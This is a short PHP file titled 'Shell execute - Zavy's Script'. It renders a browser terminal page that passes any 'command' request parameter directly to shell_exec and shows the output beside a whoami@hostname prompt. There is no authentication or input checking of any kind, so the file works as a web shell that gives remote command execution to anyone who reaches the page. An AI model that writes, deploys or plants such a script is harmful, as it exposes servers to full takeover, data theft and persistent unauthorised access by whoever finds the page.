<?php
 session_start();
 if(isset($_REQUEST['command']) && strlen($_REQUEST['command'])){
  if(strtolower($_REQUEST['command'])=="clear"){
   $_SESSION['shell']=NULL;
  }else{
   $_SESSION['shell'].=$_REQUEST['command']."\n";
   $_SESSION['shell'].=shell_exec($_REQUEST['command'])."\n";
  }
  $_SESSION['shell'].=exec('whoami')."@".exec('hostname').":".exec('pwd')."$ ";
 }
?>
<html>
 <head>
  <title>Shell execute - Zavy's Script</title>
  <script src="https://ajax.googleapis.com/ajax/libs/jquery/1.11.3/jquery.min.js"></script>
  <meta charset="UTF-8">
 </head>
 <body>
  <?php echo "<textarea id='shell' style='width:1000px;height:700px;padding:5px;border:1px solid #bbb;'>Zavy's shell execution script\n\n".$_SESSION['shell']."</textarea>"; ?>
  <form action="shell_exec.php" method="post">
   <input type="text" name="command" id="command" placeholder="Insert command and press enter" style="width:1000px;padding:5px;">
  </form>
 </body>
</html>
<script type="text/javascript">
 $('#shell').scrollTop($('#shell')[0].scrollHeight - $('#shell').height());
 $('#command').focus();
</script>